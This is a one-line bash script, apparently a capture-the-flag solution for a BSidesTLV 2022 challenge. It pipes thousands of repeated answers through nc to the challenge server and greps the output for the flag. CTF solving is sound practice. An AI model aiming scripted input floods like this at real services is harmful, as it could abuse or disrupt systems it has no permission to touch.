#!/bin/bash

python -c "print('1\n11\n' * 3000)" |  nc high-expectations.ctf.bsidestlv.com 8643 | grep -oE 'BSidesTLV2022.*'
